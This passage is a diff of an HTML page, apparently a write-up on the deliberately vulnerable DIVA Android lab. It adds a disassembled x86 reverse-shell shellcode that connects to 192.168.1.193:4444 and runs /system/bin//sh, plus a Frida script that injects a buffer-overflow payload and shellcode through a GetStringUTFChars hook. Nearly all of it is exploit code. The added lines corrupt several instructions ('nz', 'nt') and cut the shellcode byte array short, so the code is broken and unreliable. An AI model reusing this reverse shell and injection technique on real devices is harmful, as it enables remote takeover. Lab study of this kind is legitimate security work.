@@ -950,62 +950,118 @@ tuvwxyz{|}~
 <p class="message">
 <br># ndisasm -b32 final_shellcode
 <br>/* main: if (fork()) goto exit; else goto execve; */
-<br>00000000  29C0              sub eax,eax
-<br>00000002  B002              mov al,0x2
-<br>00000004  CD80              int 0x80                /* Fork syscall #2 */
-<br>00000006  85C0              test eax,eax
-<br>00000008  7502              jnz 0xc
-<br>0000000A  EB05              jmp short 0x11
+<br>00000000&nbsp;&nbsp;29C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;eax,eax
+<br>00000002&nbsp;&nbsp;B002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;al,0x2
+<br>00000004&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Fork syscall #2 */
+<br>00000006&nbsp;&nbsp;85C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;eax,eax
+<br>00000008&nbsp;&nbsp;7502&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nz&nbsp;&nbsp;0xc
+<br>0000000A&nbsp;&nbsp;EB05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;short 0x11
 <br>
 <br>/* exit: exit(x); */
-<br>0000000C  29C0              sub eax,eax 
-<br>0000000E  40                inc eax
-<br>0000000F  CD80              int 0x80                /* Exit syscall #1 */
+<br>0000000C&nbsp;&nbsp;29C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;eax,eax 
+<br>0000000E&nbsp;&nbsp;40&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;eax
+<br>0000000F&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Exit syscall #1 */
 <br>
-<br>/* start: execve() */
-<br>00000011  6A66              push byte +0x66
-<br>00000013  58                pop eax
-<br>00000014  99                cdq
-<br>00000015  52                push edx
-<br>00000016  42                inc edx
-<br>00000017  52                push edx
-<br>00000018  89D3              mov ebx,edx
-<br>0000001A  42                inc edx
-<br>0000001B  52                push edx
-<br>0000001C  89E1              mov ecx,esp
-<br>0000001E  CD80              int 0x80                /* socketcall syscall #102 */
-<br>00000020  93                xchg eax,ebx
-<br>00000021  89D1              mov ecx,edx
-<br>00000023  B03F              mov al,0x3f
-<br>00000025  CD80              int 0x80                /* dup2 syscall #63 */
-<br>00000027  49                dec ecx
-<br>00000028  79F9              jns 0x23
-<br>0000002A  B066              mov al,0x66
-<br>0000002C  87DA              xchg ebx,edx
-<br>0000002E  68C0A801C1        push dword 0xc101a8c0
-<br>00000033  6668115C          push word 0x5c11
-<br>00000037  6653              push bx
-<br>00000039  43                inc ebx
-<br>0000003A  89E1              mov ecx,esp
-<br>0000003C  6A10              push byte +0x10
-<br>0000003E  51                push ecx
-<br>0000003F  52                push edx
-<br>00000040  89E1              mov ecx,esp
-<br>00000042  CD80              int 0x80                /* socketcall syscall #102 */
-<br>00000044  6A0B              push byte +0xb
-<br>00000046  58                pop eax
-<br>00000047  99                cdq
-<br>00000048  89D1              mov ecx,edx
-<br>0000004A  52                push edx
-<br>0000004B  682F2F7368        push dword 0x68732f2f
-<br>00000050  682F62696E        push dword 0x6e69622f
-<br>00000055  6874656D2F        push dword 0x2f6d6574
-<br>0000005A  682F737973        push dword 0x7379732f
-<br>0000005F  89E3              mov ebx,esp
-<br>00000061  CD80              int 0x80                /* execve syscall #11 */
-<br>00000063  0A                db 0x0a
+<br>/* start:&nbsp;&nbsp;execve() */
+<br>00000011&nbsp;&nbsp;6A66&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;byte&nbsp;&nbsp;+0x66
+<br>00000013&nbsp;&nbsp;58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;eax
+<br>00000014&nbsp;&nbsp;99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cdq
+<br>00000015&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
+<br>00000016&nbsp;&nbsp;42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;edx
+<br>00000017&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
+<br>00000018&nbsp;&nbsp;89D3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ebx,edx
+<br>0000001A&nbsp;&nbsp;42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;edx
+<br>0000001B&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
+<br>0000001C&nbsp;&nbsp;89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,esp
+<br>0000001E&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* socketcall syscall #102 */
+<br>00000020&nbsp;&nbsp;93&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;eax,ebx
+<br>00000021&nbsp;&nbsp;89D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,edx
+<br>00000023&nbsp;&nbsp;B03F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;al,0x3f
+<br>00000025&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* dup2&nbsp;&nbsp;syscall&nbsp;&nbsp;#63 */
+<br>00000027&nbsp;&nbsp;49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dec&nbsp;&nbsp;ecx
+<br>00000028&nbsp;&nbsp;79F9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jns&nbsp;&nbsp;0x23
+<br>0000002A&nbsp;&nbsp;B066&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;al,0x66
+<br>0000002C&nbsp;&nbsp;87DA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;ebx,edx
+<br>0000002E&nbsp;&nbsp;68C0A801C1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0xc101a8c0
+<br>00000033&nbsp;&nbsp;6668115C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;word&nbsp;&nbsp;0x5c11
+<br>00000037&nbsp;&nbsp;6653&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;bx
+<br>00000039&nbsp;&nbsp;43&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;ebx
+<br>0000003A&nbsp;&nbsp;89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,esp
+<br>0000003C&nbsp;&nbsp;6A10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;byte&nbsp;&nbsp;+0x10
+<br>0000003E&nbsp;&nbsp;51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;ecx
+<br>0000003F&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
+<br>00000040&nbsp;&nbsp;89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,esp
+<br>00000042&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* socketcall&nbsp;&nbsp;syscall&nbsp;&nbsp;#102 */
+<br>00000044&nbsp;&nbsp;6A0B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;byte&nbsp;&nbsp;+0xb
+<br>00000046&nbsp;&nbsp;58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;eax
+<br>00000047&nbsp;&nbsp;99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cdq
+<br>00000048&nbsp;&nbsp;89D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,edx
+<br>0000004A&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
+<br>0000004B&nbsp;&nbsp;682F2F7368&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0x68732f2f
+<br>00000050&nbsp;&nbsp;682F62696E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0x6e69622f
+<br>00000055&nbsp;&nbsp;6874656D2F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0x2f6d6574
+<br>0000005A&nbsp;&nbsp;682F737973&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push &nbsp;&nbsp;dword&nbsp;&nbsp;0x7379732f
+<br>0000005F&nbsp;&nbsp;89E3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ebx,esp
+<br>00000061&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* execve&nbsp;&nbsp;syscall&nbsp;&nbsp;#11 */
+<br>00000063&nbsp;&nbsp;0A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db&nbsp;&nbsp;0x0a
 </p>
 <br>And the final Frida exploit script is
+<br>![14-82](https://teckk2.github.io/assets/images/DIVA/14-82.png)
+<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\n\t[\*] Java.vm.env handle: " + handlePointer);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Allocated Heap memory for BOF payload (32 A)");
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0x29, 0xc0, 0xb0, 0x02, 0xcd, 0x80, 0x85, 0xc0, 0x75, 0x02, 0xeb, 0x05, 0x29, 0xc0, 0x40, 0xcd, 0x80, 0x6a, 0x66, 0x58, 0x99, 0x52, 0x42, 0x52, 0x89, 0xd3, 0x42, 0x52, 0x89, 0xe1, 0xcd, 0x80, 0x93, 0x89, 0xd1, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x66, 0x87, 0xda, 0x68, 0xc0, 0xa8, 0x01];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(128);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Allocated Heap memory for Reverse Shell");
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Added RET address of Reverse Shell to BOF payload");
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
+<br>
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("\n\t[\*] BOF Payload + RET HExdump");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Reverse Shell Hexdump");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;});
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
 <br>
 <br>
 <br>
